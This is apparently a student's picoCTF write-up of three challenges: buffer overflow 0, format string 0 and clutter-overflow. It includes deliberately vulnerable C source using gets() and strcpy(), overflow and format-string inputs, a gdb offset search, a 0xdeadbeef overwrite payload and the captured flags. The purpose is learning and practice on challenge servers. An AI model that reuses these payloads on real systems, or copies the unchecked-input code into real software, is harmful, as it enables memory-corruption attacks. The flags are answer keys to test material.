# 1. buffer overflow 0

> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 49502

## Solution:

I start off by trying to understand the `vuln.c` code :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

I understand that the server which runs this program has a secret `flag.txt` stored, which gets read if a crash (segmentation fault) happens. So my goal is to cause a buffer overflow and see the flag (this is also more evident because the name of the challenge is buffer overflow 0 lol).

```
abirbhav@ROG-STRIX-G713IE:~$ nc saturn.picoctf.net 49329
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Concepts learnt:

learnt how buffer overflows work and how its used to exploit vulnerabilities. using gets() and strcpy() without checking input size can let someone crash the program.

## Notes:


## Resources:

GPT 4.1 (learning purposes only.)


***

# 2. format string 0

> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 59147

## Solution:

After I started, I found a menu-based program where I had to recommend a burger for each customer.  
Patrick wanted a "giant bite," I chose the option with the %114d format specifier, since it represents a large integer, and that was the correct answer.  
SpongeBob wanted to "break the shop," I selected Cla%sic_Che%s%steak, and that choice was also right.

```
abirbhav@ROG-STRIX-G713IE:~$ nc mimas.picoctf.net 59147
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_74f6c0e7}
```

## Concepts learnt:

learnt about format specifiers.  

## Notes:

-

## Resources:

-

***

# 3. clutter-overflow

> Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:

I first connect to `nc mars.picoctf.net 31890` to see whats there  

![alt text](image-1.png)

judging by the name of the challenge, it seems to be related to buffer overflow concept.

Now, I understand the working of the `chall.c`, which works in the following way:  
Since gets() keeps accepting input beyond 256 bytes, it's possible to overwrite the adjacent code variable in memory. so with the right input I can set code to 0xdeadbeef, which causes the program to reveal the flag. so by creating the right input I can change the memory value of code to 0xdeadbeef and when that happens, the program displays the FLAG.

Then I run gdb on the `chall` file given in the challenge.  
Since this is a buffer overflow, I installed and loaded GEF/PEdA into gdb for commands like pattern_create/pattern_offset. Then I run pattern_create 500 to create a cyclical pattern which then I inputted into the program again by running it again to find the offset pattern we need to execute. Here in the RBP section I found the offset pattern which is `%IA%eA%4`. Now I run `pattern_offset %IA%eA%4` to get the output as :   
```%IA%eA%4 found at offset: 272```

Then I run python with pwntools and I printout the 32 bit value of `0xdeadbeef` and then I run 'A'*272.
```
from pwn import *  
p32(0xdeadbeef)  
b'\xef\xbe\xad\xde'
'A'*272
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```
  
Next i run the program with
 echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | ./chall (basically piping the input into chall file). (\xef\xbe\xad\xde are the bytes for 0xdeadbeef). The code variable ended up as 0x4141414141414141 (the ASCII for 'A'), meaning I overflowed too far. To fix this, I reduced the number of A's in the input by four each time and retried until code was set to 0xdeadbeef.

>My room is so cluttered...  
What do you see?  
code == 0xdeadbeef: how did that happen??  
take a flag for your troubles  
picoCTF{flag}  

So finally on executing: 
>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | nc mars.picoctf.net 31890  

the output showed the flag.

>My room is so cluttered...  
What do you see?  
code == 0xdeadbeef: how did that happen??  
take a flag for your troubles  
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}



## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

learnt about the concepts of buffer overflow vulnerabilities, how to exploit them to overwrite specific variables in memory. Also became a bit more familiar with tools like gdb to debug and analyze.

## Notes:

initially inluded too many A's in the payload which overwrite the wrong part. wasted a lot in experimenting with different input lengths and offsets. 

## Resources:

[buffer-overflow-pattern-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)
[https://github.com/hugsy/gef.git ~/gef](https://github.com/hugsy/gef)


***